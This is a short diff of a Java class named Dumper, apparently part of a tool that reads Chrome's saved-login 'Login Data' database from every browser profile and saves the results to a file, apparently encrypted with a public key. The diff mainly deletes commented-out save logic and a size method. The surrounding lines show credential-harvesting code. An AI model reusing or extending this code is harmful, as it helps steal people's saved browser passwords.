@@ -55,15 +55,7 @@ public class Dumper {
             final File loginData = new File(chromeInstall.toString() + File.separator + profile.getPath(), "Login Data");
             accounts.put(profile.getName(), Dumper.readDatabase(loginData));
         }
-//        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
-//        final HashMap<File, ChromeAccount[]> accounts = new HashMap<>();
-//        for (final ChromeProfile profile : chromeProfiles) {
-//            final File loginData = new File(chromeInstall.toString() + File.separator + profile.getPath(), "Login Data");
-//            accounts.put(new File(path != null && !path.equals("")
-//                    ? path + System.getProperty("file.separator")
-//                    : pathToSave,
-//                    getCurrentTime() + "-" + System.getProperty("user.name") + ".txt"), Dumper.readDatabase(loginData));
-//        }
+
         if (chromeProfiles.size() < 1 || accounts.isEmpty()) {
             throw new InstantiationException("No chrome profiles found!");
         }
@@ -120,14 +112,6 @@ public class Dumper {
 
     public int getAmountOfProfiles() {
         return profiles.keySet().size();
-    }
-
-//    public String getDumpLocation() {
-//        return profiles.keySet().iterator().next().getParent();
-//    }
-
-    public int getDumpSize() {
-        return profiles.values().stream().mapToInt(b -> b.length).sum();
     }
 
     public boolean saveToFile(String newFiePath, String pubKeyPath) throws IOException {
